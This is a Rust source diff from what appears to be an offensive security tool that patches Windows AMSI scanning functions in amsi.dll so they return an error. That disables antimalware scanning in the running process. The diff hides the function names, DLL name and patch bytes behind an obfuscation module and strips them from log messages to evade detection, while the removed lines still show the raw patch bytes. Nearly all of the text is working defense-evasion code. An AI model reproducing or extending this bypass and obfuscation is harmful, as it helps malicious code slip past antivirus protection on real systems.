@@ -16,20 +16,20 @@ impl AmsiTarget {
         }
     }
 
-    pub fn name(&self) -> &'static str {
+    pub fn name(&self) -> String {
         match self {
-            Self::AmsiScanBuffer => "AmsiScanBuffer",
-            Self::AmsiScanString => "AmsiScanString",
+            Self::AmsiScanBuffer => crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
+            Self::AmsiScanString => crate::obf::s(crate::obf::AMSI_SCAN_STRING),
         }
     }
 
-    pub fn dll(&self) -> &'static str {
-        "amsi.dll"
+    pub fn dll(&self) -> String {
+        crate::obf::s(crate::obf::AMSI_DLL)
     }
 
-    pub fn patch_bytes(&self) -> &'static [u8] {
-        // mov eax, 0x80070057 (E_INVALIDARG); ret
-        &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+    pub fn patch_bytes(&self) -> Vec<u8> {
+        let p = crate::obf::ba(&crate::obf::AMSI_PATCH);
+        p.to_vec()
     }
 
     pub fn all() -> &'static [Self] {
@@ -44,7 +44,7 @@ pub struct PatchState {
 }
 
 pub fn dry_run(target: &str, log: &LogSink) {
-    let name: &str = AmsiTarget::from_str(target).map_or(target, |t| t.name());
+    let name: String = AmsiTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());
 
     log.info(format!("[DRY RUN] AMSI Bypass — {name}"));
     log.detail(format!("  Target: {name} in amsi.dll"));
@@ -98,14 +98,14 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let dll_name = amsi_target.dll();
     let patch = amsi_target.patch_bytes();
 
-    log.step(format!("[1/5] LoadLibraryA(\"{dll_name}\")"));
-    let dll_cstr = CString::new(dll_name)
+    log.step(format!("[1/5] LoadLibraryA(\"...\")"));
+    let dll_cstr = CString::new(dll_name.as_str())
         .map_err(|e| format!("invalid DLL name: {e}"))?;
     let dll_handle = unsafe { LoadLibraryA(PCSTR(dll_cstr.as_ptr() as *const u8)) }
         .map_err(|e| format!("LoadLibraryA failed: {e} — amsi.dll may not be available"))?;
 
-    log.step(format!("[2/5] GetProcAddress(\"{func_name}\")"));
-    let func_cstr = CString::new(func_name)
+    log.step(format!("[2/5] GetProcAddress(...)"));
+    let func_cstr = CString::new(func_name.as_str())
         .map_err(|e| format!("invalid function name: {e}"))?;
     let func_addr = unsafe { GetProcAddress(dll_handle, PCSTR(func_cstr.as_ptr() as *const u8)) }
         .ok_or_else(|| format!("GetProcAddress failed: {func_name} not found in {dll_name}"))?;
@@ -207,11 +207,9 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
 pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let amsi_target = AmsiTarget::from_str(target)
         .ok_or_else(|| format!("unknown AMSI target: {target}"))?;
-    log.warning(format!(
-        "  AMSI bypass requires Windows. Would patch {} in {}.",
-        amsi_target.name(),
-        amsi_target.dll()
-    ));
+    let _name = amsi_target.name();
+    let _dll = amsi_target.dll();
+    log.warning("  AMSI bypass requires Windows.".to_string());
     Err("AMSI bypass is only available on Windows".to_string())
 }
 
